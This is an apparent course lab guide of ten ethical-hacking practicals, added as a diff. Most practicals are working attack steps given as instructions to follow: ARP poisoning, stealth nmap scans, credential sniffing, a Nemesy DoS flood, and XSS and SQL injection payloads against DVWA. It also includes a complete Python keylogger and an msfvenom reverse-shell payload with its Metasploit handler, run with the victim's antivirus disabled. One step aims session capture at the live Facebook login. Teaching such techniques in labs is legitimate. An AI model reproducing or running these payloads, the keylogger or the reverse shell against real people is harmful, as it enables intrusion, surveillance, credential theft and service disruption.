@@ -1,0 +1,204 @@
+Ethical Hacking Practical Guide
+
+✅ Practical 1: Google & Whois Reconnaissance
+Aim: Use Google and Whois for Reconnaissance
+🔍 Using Whois:
+1.Go to  “ https://who.is “
+2.Enter a domain name ( bhavnatrustscollege.com )
+
+3.View:
+  Registrant Name
+  Contact info
+  Domain status and expiration
+
+==================================================================================================================
+
+✅ Practical 2: CrypTool (RC4 Encryption/Decryption) & Cain and Abel (Password Cracking)
+🔐 (a) CrypTool (RC4 Encryption)
+
+1.Download from cryptool.org
+2.Open CrypTool → Type your plaintext.
+3.Go to: Encrypt/Decrypt > Symmetric(modern) > RC4
+4.Select key length (e.g., 128 bits) → Enter key → Click Encrypt
+5.To decrypt:
+6.Go to same RC4 section → Enter encrypted text and key → Click Decrypt
+
+
+🔓 (b) Cain and Abel - Dictionary Attack
+
+1.Install & open Cain and Abel (Run as Admin).
+2.Click Cracker tab > Hash Calculator
+3.Enter a password → Generate MD5 hash → Copy hash.
+4.Go to MD5 Hashes → Add list → Paste hash.
+5.Right-click hash → Dictionary Attack → Add dictionary → Start.
+
+==================================================================================================================
+
+✅ Practical 3: Linux Network Commands & ARP Poisoning
+📡 (a) Linux Commands:
+1.ifconfig – shows IP address, MAC, etc.
+2.ping <IP> – test connectivity.
+3.netstat – show active connections, listening ports.
+4.traceroute <IP> – path a packet takes to reach destination.
+
+
+🧨 (b) ARP Poisoning (Cain and Abel - Windows)
+1.Open Cain and Abel → Click Sniffer tab
+2.Start sniffer → Scan network.
+3.Right-click IP → Resolve Hostname
+4.Click ARP tab → Add router and victim IP.
+5.Select both IPs → Click ARP Poisoning button to begin.
+
+==================================================================================================================
+
+
+✅ Practical 4: Nmap Port Scanning
+Target IP: Replace 192.168.0.1 with your target.
+Scan Type
+Command
+Description
+1.ACK
+nmap -sA 192.168.0.1
+Firewall detection
+
+2.SYN
+nmap -sS 192.168.0.1
+Stealth scan
+
+3.FIN
+nmap -sF 192.168.0.1
+Firewall bypass
+
+4.NULL
+nmap -sN 192.168.0.1
+Silent scan
+
+5.XMAS
+nmap -sX 192.168.0.1
+Fancy packet flags
+
+
+==================================================================================================================
+
+
+✅ Practical 5: Wireshark Sniffing & Nemesy DoS Attack
+🔍 (a) Wireshark
+1.Start Wireshark → Choose ethernet or wifi
+2.Open a browser → Visit HTTP site. “ test.php “  ( http://testphp.vulnweb.com/login.php )
+3.Give login information ( username = admin / password = admin )
+4.Apply filter: http
+5.Right-click POST packet → Follow > TCP stream
+6.Look for credentials in the stream.
+
+
+💥 (b) Nemesy DoS
+1.Open Nemesy (Run as Administrator)
+2.Enter Victim IP
+3.Set packets = 0 (infinite), Size = 65000, Delay = 1ms
+4.Click Start/Send
+5.Monitor network traffic ( windows > CPU > performance)
+
+==================================================================================================================
+
+
+✅ Practical 6: Stored XSS (DVWA)
+1.Download DVWA-master from github ( https://github.com/digininja/DVWA )
+2.Extract DVWA-master → Paste in C:\xampp\htdocs\
+3.Rename config file to config.inc.php
+4.Change  DB_USER = ‘root’  (line 20/21)
+5.Change  DB_PASSWORD = ‘’ (NULL-remove the already written password)
+6.Change  DEFAULT_SECURITY_LEVEL = 'low'; (impossible to low)
+7.Open xampp and start apache and mySQL
+8.Open browser → localhost/DVWA-master
+9.Click "Create/Reset Database"
+10.Login → Username: admin, Password: password
+11.Set security to low
+12.Go to XSS (Stored) → Input: write code : 
+
+ write this code
+<script>alert('XSS');</script>
+
+13.Click "Sign Guestbook" → Reload page to trigger script.
+
+
+==================================================================================================================
+
+
+✅ Practical 7: Session Impersonation with Tamper Data (Firefox)
+1.Install Tamper Data from Firefox Add-ons
+2.Open Facebook login page
+3.Start Tamper Data
+4.Enter credentials and login
+5.Start/Capture and analyze requests for session tokens/cookies
+
+==================================================================================================================
+
+
+✅ Practical 8: SQL Injection (DVWA)
+1.Download DVWA-master from github ( https://github.com/digininja/DVWA )
+2.Extract DVWA-master → Paste in C:\xampp\htdocs\
+3.Rename config file to config.inc.php
+4.Change  DB_USER = ‘root’  (line 20/21)
+5.Change  DB_PASSWORD = ‘’ (NULL-remove the already written password)
+6.Change  DEFAULT_SECURITY_LEVEL = 'low'; (impossible to low)
+7.Open xampp and start apache and mySQL
+8.Open browser → localhost/DVWA-master
+9.Click "Create/Reset Database"
+10.Login → Username: admin, Password: password
+11.Set security to low
+
+12.Go to SQL Injection page.
+
+Enter 1 → Submit
+
+  write this code
+1' OR '1'='1';-- 
+
+13.Observe login bypass or data dump.
+
+
+==================================================================================================================
+
+
+
+✅ Practical 9: Simple Python Keylogger
+# Python code
+
+from pynput.keyboard import Listener
+
+def write_to_file(key):
+    key_data = str(key).replace("'", "")
+    with open("log.txt", "a") as f:
+        f.write(key_data + "\n")
+
+with Listener(on_press=write_to_file) as listener:
+    listener.join()
+
+# Save as keylogger.py and run. Output gets saved in log.txt.
+
+==================================================================================================================
+
+
+✅ Practical 10: Metasploit Exploit (Reverse Shell)
+1.Open Kali Linux → Terminal:
+2.Generate payload:
+
+ write this code
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.143 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/payload.exe
+
+
+3.Start Metasploit: start writing these command step-by-step
+
+4.msfconsole
+5.use exploit/multi/handler
+6.set payload windows/shell/reverse_tcp
+7.set LHOST 192.168.1.143
+8.set LPORT 31337
+9.exploit
+
+10.Transfer / Copy payload.exe to Windows victim and execute (disable antivirus).
+
+11.Kali gets reverse shell access.
+
+
+
